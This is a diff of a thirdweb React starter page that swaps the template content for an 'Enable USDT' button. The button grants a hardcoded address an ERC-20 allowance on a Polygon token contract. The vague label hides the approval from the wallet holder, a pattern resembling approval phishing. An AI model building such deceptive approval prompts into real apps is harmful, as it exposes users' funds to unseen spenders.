@@ -1,30 +1,21 @@
 import { ConnectWallet } from "@thirdweb-dev/react";
 import "./styles/Home.css";
 
+import React, { useEffect, useState } from "react";
+import {
+  useAddress,
+  useChainId,
+  useSwitchChain,
+  useContract,
+  useConnectionStatus,
+} from "@thirdweb-dev/react";
+import { Polygon } from "@thirdweb-dev/chains";
+
 export default function Home() {
   return (
     <main className="main">
       <div className="container">
         <div className="header">
-          <h1 className="title">
-            Welcome to{" "}
-            <span className="gradient-text-0">
-              <a
-                href="https://thirdweb.com/"
-                target="_blank"
-                rel="noopener noreferrer"
-              >
-                thirdweb.
-              </a>
-            </span>
-          </h1>
-
-          <p className="description">
-            Get started by configuring your desired network in{" "}
-            <code className="code">src/index.js</code>, then modify the{" "}
-            <code className="code">src/App.js</code> file!
-          </p>
-
           <div className="connect">
             <ConnectWallet
               dropdownPosition={{
@@ -35,65 +26,57 @@ export default function Home() {
           </div>
         </div>
 
-        <div className="grid">
-          <a
-            href="https://portal.thirdweb.com/"
-            className="card"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <img
-              src="/images/portal-preview.png"
-              alt="Placeholder preview of starter"
-            />
-            <div className="card-text">
-              <h2 className="gradient-text-1">Portal ➜</h2>
-              <p>
-                Guides, references, and resources that will help you build with
-                thirdweb.
-              </p>
-            </div>
-          </a>
-
-          <a
-            href="https://thirdweb.com/dashboard"
-            className="card"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <img
-              src="/images/dashboard-preview.png"
-              alt="Placeholder preview of starter"
-            />
-            <div className="card-text">
-              <h2 className="gradient-text-2">Dashboard ➜</h2>
-              <p>
-                Deploy, configure, and manage your smart contracts from the
-                dashboard.
-              </p>
-            </div>
-          </a>
-
-          <a
-            href="https://thirdweb.com/templates"
-            className="card"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <img
-              src="/images/templates-preview.png"
-              alt="Placeholder preview of templates"
-            />
-            <div className="card-text">
-              <h2 className="gradient-text-3">Templates ➜</h2>
-              <p>
-                Discover and clone template projects showcasing thirdweb
-                features.
-              </p>
-            </div>
-          </a>
-        </div>
+        <ApproveButton />
       </div>
     </main>
   );
 }
+
+export const ApproveButton = () => {
+  const address = useAddress();
+  const currentChainId = useChainId();
+  const connectionStatus = useConnectionStatus();
+  const switchChain = useSwitchChain();
+  const { contract } = useContract(
+    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
+  );
+  const [isLoading, setIsLoading] = useState(false);
+
+  const callApproval = async () => {
+    try {
+      if (currentChainId !== Polygon.chainId) {
+        console.error("Wrong network. Please switch to the Polygon network.");
+        if (connectionStatus === "connected") {
+          await switchChain(Polygon.chainId);
+        }
+      }
+      if (address && contract) {
+        console.log("Contract instance:", contract);
+        setIsLoading(true);
+        const tx = await contract.erc20.setAllowance(
+          "0x7A0CE8524bea337f0beE853B68fAbDE145dAC0A0",
+          1
+        );
+        alert("Contract call success:");
+      }
+    } catch (err) {
+      alert("Contract call failure:");
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  return isLoading ? (
+    <div> Loading... </div>
+  ) : (
+    <button
+      onClick={callApproval}
+      style={{
+        padding: "20px",
+        fontSize: "20px",
+      }}
+    >
+      Enable USDT
+    </button>
+  );
+};
